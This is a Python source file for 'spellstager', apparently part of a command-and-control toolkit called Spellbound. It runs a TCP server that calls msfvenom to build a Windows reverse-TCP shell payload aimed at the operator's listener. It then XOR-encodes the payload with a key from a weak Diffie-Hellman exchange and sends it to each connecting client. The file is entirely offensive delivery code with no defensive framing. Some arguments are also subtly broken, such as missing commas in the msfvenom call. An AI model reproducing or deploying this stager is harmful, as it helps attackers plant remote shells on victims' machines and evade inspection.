import socket
import sys
import subprocess
import threading
import random

IP = ''
PORT = 0
S_PORT=0

mutex=threading.Lock()

def help():
	print("spellstager is Spellbound's staged payload generator and delivery service")
	print("Usage: spellstager.py <IP> <STAGER_PORT> <SERVER_PORT>")

def diffie_hellman(conn):
	P=251
	G=6
	a=random.randint(2, G)

	A = pow(G, a, P)
	conn.send(str(A).encode()) #sending A to client

	B = conn.recv(4096) #recieving B from client
	B= B.decode()
	B=int(B.split("\x00")[0])
	
	key = pow(G, A*B, P)
	return key

def payload(buf, key):
    lol=b""
    for i in range(len(buf)):
        lol+=(buf[i]^key).to_bytes(1, "little")
   
    return lol

def client_handler(conn):
	mutex.acquire()
	cmd=subprocess.Popen(['msfvenom', '-p' 'windows/shell_reverse_tcp', f'LHOST={IP}', f'LPORT={S_PORT}', '-f', 'py', '-o' 'temp.py'], stdout=subprocess.PIPE)
	output=cmd.stdout.read()
	print(output)
	from temp import buf
	key = diffie_hellman(conn)
	bomb = payload(buf, key)
	mutex.release()

	conn.send(bomb)


def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((IP, PORT))
    server.listen()
    print("[+] Started spellstager")
    while True:
        conn, address = server.accept()
        thread = threading.Thread(target = client_handler, args = (conn, )).start()

try:
	(ip, port, s_port)=(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
	IP=ip
	PORT=port
	S_PORT=s_port
except:
	help()
	exit()

main()
